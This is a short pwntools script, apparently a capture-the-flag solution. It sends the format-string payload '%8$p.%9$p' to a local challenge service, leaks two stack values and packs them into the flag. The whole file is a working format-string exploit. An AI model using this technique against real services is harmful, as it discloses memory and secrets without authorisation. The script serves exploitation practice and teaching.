#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"

LOCAL_BINARY = "./task"
REMOTE_IP = "127.0.0.1"
REMOTE_PORT = 9001

#p = process(LOCAL_BINARY)
p = remote(REMOTE_IP, REMOTE_PORT)
#gdb.attach(p, gdbscript="")

p.sendline(b"%8$p.%9$p")

leaks = p.readline().decode().split(".")
flag = struct.pack("<Q", int(leaks[0], 16))
flag += struct.pack("<Q", int(leaks[1], 16))

print(flag)
